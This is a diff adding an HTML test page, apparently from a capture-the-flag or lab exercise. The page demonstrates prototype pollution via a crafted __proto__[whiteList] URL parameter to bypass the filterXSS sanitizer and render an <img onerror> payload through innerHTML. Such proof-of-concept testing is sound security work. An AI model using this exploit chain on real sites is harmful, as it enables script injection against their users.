@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Prototype Pollution</title>
+    <script src="http://94.237.51.6:30154/static/js/parseParams.js"></script>
+    <script src="http://94.237.51.6:30154/static/js/xss.js"></script>
+</head>
+<body>
+<h1>Testing Prototype Pollution</h1>
+<div id="output"></div>
+
+<script>
+// Simulate the attack
+console.log("Starting test...");
+
+// Parse malicious URL
+const maliciousUrl = "http://test.com/?__proto__[whiteList][img][]=onerror&search=<img src=x onerror=alert(1)>";
+const params = parseParams(maliciousUrl);
+
+console.log("Params:", params);
+console.log("Prototype pollution test:", {}.__proto__.whiteList);
+
+// Now try to use filterXSS with polluted prototype
+const xssInput = '<img src=x onerror=alert(1)>';
+const filtered = filterXSS(xssInput);
+
+document.getElementById('output').innerHTML = `
+    <p>Input: ${xssInput}</p>
+    <p>Filtered: ${filtered}</p>
+    <p>Prototype polluted: ${JSON.stringify({}.__proto__.whiteList)}</p>
+`;
+
+console.log("Filtered output:", filtered);
+</script>
+</body>
+</html>
